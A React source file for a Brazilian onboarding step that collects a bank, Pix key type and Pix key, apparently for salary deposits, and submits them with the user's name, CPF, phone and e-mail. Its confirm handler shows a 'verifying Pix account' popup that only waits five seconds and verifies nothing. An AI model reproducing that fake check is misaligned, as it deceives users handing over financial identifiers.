/* eslint-disable no-unused-vars */
/* eslint-disable react/prop-types */
import React, { useState, useContext } from 'react';
import '../../styles/refino.css';
import { motion } from 'framer-motion';
import { ProcessContext } from '../../contexts/ProcessContextDefinition.js';
import Header from "../modules/Header";
import Maintexts from "../modules/Main-texts";
import Paragraphs from "../modules/Paragraphs";
import Imputs from "../modules/Imputs"; // componente padrão

/* =========================
   Ícone fornecido (SVG)
   ========================= */
const BankSettingsIcon = (props) => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    width={props.width ?? 20}
    height={props.height ?? 20}
    viewBox="0 0 16 16"
    className={props.className}
  >
    <path
      fill={props.fill ?? "#3455ff"}
      fillRule="evenodd"
      d="M7.605 2.112a.75.75 0 0 1 .79 0l5.25 3.25A.75.75 0 0 1 13 6.707V12.5h.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H3V6.707a.75.75 0 0 1-.645-1.345zM4.5 8.75a.75.75 0 0 1 1.5 0v3a.75.75 0 0 1-1.5 0zM8 8a.75.75 0 0 0-.75.75v3a.75.75 0 0 0 1.5 0v-3A.75.75 0 0 0 8 8m2 .75a.75.75 0 0 1 1.5 0v3a.75.75 0 0 1-1.5 0zM8 6a1 1 0 1 0 0-2a1 1 0 0 0 0 2"
      clipRule="evenodd"
    />
  </svg>
);

/* =========================
   COMPONENTE DE SKELETON/SHIMMER
   ========================= */
const SkeletonLoader = ({ className = "", style = {} }) => (
  <div 
    className={`animate-pulse bg-gradient-to-r from-gray-200 via-gray-100 to-gray-200 bg-[length:200%_100%] rounded-[2vw] ${className}`}
    style={{
      animation: 'shimmer 2s infinite linear',
      background: 'linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%)',
      backgroundSize: '200% 100%',
      ...style
    }}
  />
);

/* Adicionando CSS para animação shimmer */
const shimmerStyles = `
  @keyframes shimmer {
    0% {
      background-position: -200% 0;
    }
    100% {
      background-position: 200% 0;
    }
  }
  
  .shimmer-animation {
    background: linear-gradient(90deg, 
      rgba(255,255,255,0) 0%, 
      rgba(255,255,255,0.4) 50%, 
      rgba(255,255,255,0) 100%);
    background-size: 200% 100%;
    animation: shimmer 2s infinite;
  }
  
  .skeleton-blur {
    filter: blur(8px);
    opacity: 0.7;
    transition: all 0.3s ease;
  }
`;

/* =========================
   HELPERS PIX (formatação/validação)
   ========================= */
const onlyDigits = (s = "") => s.replace(/\D+/g, "");

const formatCPF = (v = "") => {
  const d = onlyDigits(v).slice(0, 11);
  return d
    .replace(/^(\d{3})(\d)/, "$1.$2")
    .replace(/^(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/\.(\d{3})(\d)/, ".$1-$2");
};
const validateCPF = (v = "") => onlyDigits(v).length === 11;

const formatCNPJ = (v = "") => {
  const d = onlyDigits(v).slice(0, 14);
  return d
    .replace(/^(\d{2})(\d)/, "$1.$2")
    .replace(/^(\d{2})\.(\d{3})(\d)/, "$1.$2.$3")
    .replace(/\.(\d{3})(\d)/, ".$1/$2")
    .replace(/(\d{4})(\d)/, "$1-$2");
};
const validateCNPJ = (v = "") => onlyDigits(v).length === 14;

const formatPhoneBR = (v = "") => {
  let d = onlyDigits(v);
  if (!d.startsWith("55")) d = "55" + d;
  d = d.slice(0, 13);
  const cc = d.slice(0, 2);
  const ddd = d.slice(2, 4);
  const rest = d.slice(4);
  let out = `+${cc}`;
  if (ddd) out += ` (${ddd})`;
  if (rest.length > 5) out += ` ${rest.slice(0, 5)}-${rest.slice(5)}`;
  else if (rest) out += ` ${rest}`;
  return out.trim();
};
const validatePhoneBR = (v = "") => {
  const d = onlyDigits(v);
  return d.length === 13 && d.startsWith("55");
};

const validateEmail = (v = "") =>
  /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v.trim());

const validateEVP = (v = "") => {
  const s = v.trim();
  const uuidRegex =
    /^[0-9a-fA-F]{8}-?[0-9a-fA-F]{4}-?[1-5][0-9a-fA-F]{3}-?[89abAB][0-9a-fA-F]{3}-?[0-9a-fA-F]{12}$/;
  return uuidRegex.test(s);
};

const getPlaceholder = (tipo) => {
  switch (tipo) {
    case "CPF":
      return "000.000.000-00";
    case "CNPJ":
      return "00.000.000/0000-00";
    case "Telefone":
      return "+55 (11) 91234-5678";
    case "E-mail":
      return "exemplo@dominio.com";
    case "Chave aleatória":
      return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";
    default:
      return "";
  }
};

const getError = (tipo, valor) => {
  if (!valor) return null;
  switch (tipo) {
    case "CPF":
      return validateCPF(valor) ? null : "CPF inválido";
    case "CNPJ":
      return validateCNPJ(valor) ? null : "CNPJ inválido";
    case "Telefone":
      return validatePhoneBR(valor) ? null : "Telefone inválido (use DDD e +55)";
    case "E-mail":
      return validateEmail(valor) ? null : "E-mail inválido";
    case "Chave aleatória":
      return validateEVP(valor) ? null : "Chave aleatória (EVP) inválida";
    default:
      return null;
  }
};

const nextValueByTipo = (tipo, raw) => {
  switch (tipo) {
    case "CPF":
      return formatCPF(raw);
    case "CNPJ":
      return formatCNPJ(raw);
    case "Telefone":
      return formatPhoneBR(raw);
    case "E-mail":
    case "Chave aleatória":
    default:
      return raw;
  }
};

const inputModeByTipo = (tipo) => {
  switch (tipo) {
    case "CPF":
    case "CNPJ":
    case "Telefone":
      return "numeric";
    default:
      return "text";
  }
};

const maxLengthByTipo = (tipo) => {
  switch (tipo) {
    case "CPF":
      return 14;
    case "CNPJ":
      return 18;
    case "Telefone":
      return 20;
    case "E-mail":
      return 120;
    case "Chave aleatória":
      return 60;
    default:
      return 120;
  }
};

/* =========================
   SEÇÃO PIX (Banco / Tipo / Chave)
   ========================= */
const BancoPixSection = ({ onChange, isLoading = false }) => {
  const [bancoInput, setBancoInput] = useState("");
  const [bancoSelecionado, setBancoSelecionado] = useState(null);
  const [tipo, setTipo] = useState("CPF");
  const [chave, setChave] = useState("");
  const [erroChave, setErroChave] = useState(null);
  const [bancos, setBancos] = useState([]);
  const [loadingBancos, setLoadingBancos] = useState(true);
  const [erroBancos, setErroBancos] = useState(null);
  const bancoInputRef = React.useRef(null);

  const tipos = ["CPF", "CNPJ", "Telefone", "E-mail", "Chave aleatória"];

  React.useEffect(() => {
    onChange?.({
      banco: bancoSelecionado ? bancoSelecionado.code || bancoSelecionado.ispb : "",
      tipo,
      chave,
      valido: !!chave && !erroChave && bancoSelecionado,
      erro: erroChave || null,
    });
  }, [bancoSelecionado, tipo, chave, erroChave, onChange]);

  // Busca bancos da API BrasilAPI
  React.useEffect(() => {
    async function fetchBancos() {
      setLoadingBancos(true);
      setErroBancos(null);
      try {
        const res = await fetch("https://brasilapi.com.br/api/banks/v1");
        const data = await res.json();
        const bancosOrdenados = data.sort((a, b) => a.name.localeCompare(b.name));
        setBancos(bancosOrdenados);
      } catch (err) {
        setErroBancos("Falha ao carregar bancos. Tente novamente mais tarde.");
      } finally {
        setLoadingBancos(false);
      }
    }
    fetchBancos();
  }, []);

  // Filtra bancos conforme busca
  const bancosFiltrados = bancoInput
    ? bancos.filter(b => b.name.toLowerCase().includes(bancoInput.toLowerCase()))
    : bancos;

  const handleTipo = (e) => {
    const novo = e.target.value;
    setTipo(novo);
    setChave((prev) => nextValueByTipo(novo, prev));
    setErroChave(getError(novo, chave));
  };

  const handleChave = (e) => {
    const raw = e.target.value;
    const formatado = nextValueByTipo(tipo, raw);
    setChave(formatado);
    setErroChave(getError(tipo, formatado));
  };

  // 🔴 Erro específico para banco não selecionado
  const bancoErro = bancoInput && !bancoSelecionado ? "Selecione um Banco" : null;

  if (isLoading || loadingBancos) {
    return (
      <div className="mt-6 space-y-4">
        {/* Skeleton para Banco */}
        <div>
          <SkeletonLoader className="h-4 w-16 mb-2" />
          <SkeletonLoader className="h-14 w-full" />
        </div>

        {/* Skeleton para Tipo de chave */}
        <div>
          <SkeletonLoader className="h-4 w-24 mb-2" />
          <SkeletonLoader className="h-14 w-full" />
        </div>

        {/* Skeleton para Chave Pix */}
        <div>
          <SkeletonLoader className="h-4 w-20 mb-2" />
          <SkeletonLoader className="h-14 w-full" />
        </div>
      </div>
    );
  }

  return (
    <div className="mt-6 space-y-4">
      {/* Banco com Autocomplete */}
      <div className="relative">
        <label className="font-hendrix-medium text-gray-700" style={{ fontSize: "12pt" }}>
          Banco
        </label>
        <input
          ref={bancoInputRef}
          type="text"
          value={bancoInput}
          onChange={e => {
            setBancoInput(e.target.value);
            setBancoSelecionado(null);
          }}
          required
          placeholder={loadingBancos ? 'Carregando...' : 'Digite para buscar banco...'}
          disabled={loadingBancos}
          className="imputs font-hendrix-regular w-full px-4 py-4 border rounded-[2vw] bg-[#f9fcff] border-gray-200 mb-2 placeholder:text-gray-500
                     focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-transparent focus:bg-white
                     text-gray-900 leading-[1.2]"
          style={{ fontSize: "12pt", minWidth: '0', letterSpacing: '0.5px' }}
        />
        {bancosFiltrados.length > 0 && !bancoSelecionado && bancoInput && (
          <div className="absolute left-0 right-0 mt-1 bg-white border border-gray-200 rounded-xl shadow-lg z-20 max-h-48 overflow-y-auto">
            {bancosFiltrados.map((banco) => (
              <div
                key={banco.ispb}
                className="px-4 py-2 cursor-pointer hover:bg-blue-50 text-gray-900"
                onClick={() => {
                  setBancoInput(banco.name);
                  setBancoSelecionado(banco);
                }}
              >
                {banco.name}
              </div>
            ))}
          </div>
        )}

        {/* Erro da API de bancos */}
        {erroBancos && (
          <p className="text-red-500 text-sm mt-2">{erroBancos}</p>
        )}

        {/* 🔴 Erro de validação: banco não selecionado */}
        {bancoErro && !erroBancos && (
          <p className="text-red-500 text-sm mt-2">
            {bancoErro}
          </p>
        )}
      </div>

      {/* Tipo de chave */}
      <div>
        <label className="font-hendrix-medium text-gray-700" style={{ fontSize: "12pt" }}>
          Tipo de chave
        </label>
        <select
          aria-label="Tipo de chave"
          value={tipo}
          onChange={handleTipo}
          className="imputs font-hendrix-regular w-full px-4 py-4 border rounded-[2vw] bg-[#f9fcff] border-gray-200
                     focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-transparent focus:bg-white
                     text-gray-900 leading-[1.2] placeholder:text-gray-500"
          style={{ fontSize: "12pt", minWidth: '0', letterSpacing: '0.5px' }}
        >
          {tipos.map((t) => (
            <option key={t} value={t}>
              {t}
            </option>
          ))}
        </select>
      </div>

      {/* Chave Pix – usando Imputs padrão */}
      <Imputs
        id="chave-pix"
        label="Chave Pix"
        placeholder={getPlaceholder(tipo)}
        value={chave}
        onChange={handleChave}
        inputMode={inputModeByTipo(tipo)}
        maxLength={maxLengthByTipo(tipo)}
        error={erroChave} // se você tirar o render de erro de dentro do Imputs, aqui não duplica mais
        className="placeholder:text-gray-500"
        style={{ minWidth: '0', letterSpacing: '0.5px' }}
      />
    </div>
  );
};

/* =========================
   COMPONENTE PRINCIPAL
   ========================= */
const PaymentConfirmDataStep = ({ onConfirmar, setNumbPhone, setUserName }) => {
  const { processData, updateUserData, registerUser } = useContext(ProcessContext);
  const userData = processData?.userData || {};

  const [pixState, setPixState] = useState({
    banco: '',
    tipo: 'CPF',
    chave: '',
    valido: false,
    erro: null
  });

  const [loading, setLoading] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [showPopup, setShowPopup] = useState(false);
  const [popupMessage, setPopupMessage] = useState('');
  const [popupSuccess, setPopupSuccess] = useState(false);

  const canSubmit = pixState.valido && !loading;

  // Simula carregamento inicial
  React.useEffect(() => {
    const timer = setTimeout(() => {
      setInitialLoading(false);
    }, 2000);

    return () => clearTimeout(timer);
  }, []);

  const handleConfirmar = async () => {
    if (!canSubmit) return;

    setLoading(true);
    setShowPopup(true);
    setPopupMessage('Verificando Conta Chave Pix para recebimento...');
    setPopupSuccess(false);

    const nomeCompleto =
      userData.nome ||
      `${userData.firstName || ''} ${userData.lastName || ''}`.trim();

    const telefoneBr = userData.phone || '';

    const payload = {
      nomeCompleto,
      cpf: userData.cpf || '',
      telefone: telefoneBr,
      email: userData.email || '',
      banco: pixState.banco,
      tipoChave: pixState.tipo,
      chavePix: pixState.chave,
    };

    updateUserData(payload);
    setNumbPhone?.(telefoneBr);
    setUserName?.(nomeCompleto);

    // Simula a verificação da chave Pix
    await new Promise(resolve => setTimeout(resolve, 5000));

    setPopupMessage('Direcionando colaborador para finalizar processo seletivo');
    setPopupSuccess(true);

    await registerUser(payload);

    setTimeout(async () => {
      if (onConfirmar) await onConfirmar(payload);
      setLoading(false);
      setShowPopup(false);
    }, 1000);
  };

  return (
    <>
      <style>{shimmerStyles}</style>
      <div className="flex flex-col bg-white">
        <Header rightText="Area do colaborador" />
        <section id='ETP7T2'/>
        <div className="flex-1 flex flex-col justify-start px-6 pt-10">
          <Maintexts>
            <div className="flex items-center mb-4">
              {initialLoading ? (
                <SkeletonLoader className="w-5 h-5 mr-2" />
              ) : (
                <BankSettingsIcon className="w-5 h-5 mr-2" />
              )}
              
              {initialLoading ? (
                <SkeletonLoader className="h-6 w-64" />
              ) : (
                <h2 className="text-[4.5vw] font-semibold text-black">Configurações Bancárias</h2>
              )}
            </div>
            
            {initialLoading ? (
              <div className="space-y-2">
                <SkeletonLoader className="h-4 w-full" />
                <SkeletonLoader className="h-4 w-3/4" />
              </div>
            ) : (
              <Paragraphs variant="black">
                Informe o <strong>Banco</strong>, o <strong>tipo de chave</strong> e a sua <strong>chave pix</strong>. Usaremos ela para depositar o<br/> seu salário mensal.
              </Paragraphs>
            )}
          </Maintexts>

          {/* Seção PIX */}
          <BancoPixSection onChange={setPixState} isLoading={initialLoading} />

          {/* 🔴 Removido o render global de erro para não duplicar
          {!initialLoading && pixState.erro && (
            <p className="text-red-500 font-hendrix-regular mt-2 text-sm">
              {pixState.erro}
            </p>
          )} */}

          {/* Botão confirmar (azul) */}
          <div className="w-full pb-8 pt-10">
            {initialLoading ? (
              <SkeletonLoader className="h-14 w-full rounded-full" />
            ) : (
              <motion.button
                type="button"
                onClick={handleConfirmar}
                disabled={!canSubmit}
                whileTap={{ scale: 0.97 }}
                whileHover={{ scale: !canSubmit ? 1 : 1.03 }}
                className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md
                  focus:outline-none focus:ring-2 focus:ring-[#3455ff]
                  transition-all duration-300
                  bg-[#3455ff] hover:bg-[#3455ff]/90
                  ${!canSubmit ? 'cursor-not-allowed opacity-60' : ''}`}
                style={{
                  fontSize: '15pt',
                  boxShadow: '0 2px 8px 0 rgba(52,85,255,0.18)',
                  border: 'none',
                  opacity: !canSubmit ? 0.7 : 1
                }}
              >
                {loading ? (
                  <>
                    <motion.div
                      className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                      animate={{ rotate: 360 }}
                      transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                      style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                    />
                    <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
                  </>
                ) : (
                  <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Salvar e confirmar</span>
                )}
              </motion.button>
            )}

            {!initialLoading && !pixState.valido && (
              <p className="text-gray-500 text-sm mt-3">
                {/* mensagem opcional */}
              </p>
            )}
          </div>
        </div>

        {/* Popup de Verificação */}
        {showPopup && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <motion.div
              initial={{ opacity: 0, scale: 0.8 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.8 }}
              transition={{ duration: 0.3 }}
              className="bg-white p-8 rounded-lg shadow-lg text-center max-w-sm mx-4"
            >
              <div className="flex justify-center mb-4">
                {popupSuccess ? (
                  <svg className="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                ) : (
                  <motion.div
                    className="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full"
                    animate={{ rotate: 360 }}
                    transition={{ repeat: Infinity, duration: 1, ease: 'linear' }}
                  />
                )}
              </div>
              <p className="text-lg font-semibold text-gray-800">{popupMessage}</p>
            </motion.div>
          </div>
        )}
      </div>
    </>
  );
};

export default PaymentConfirmDataStep;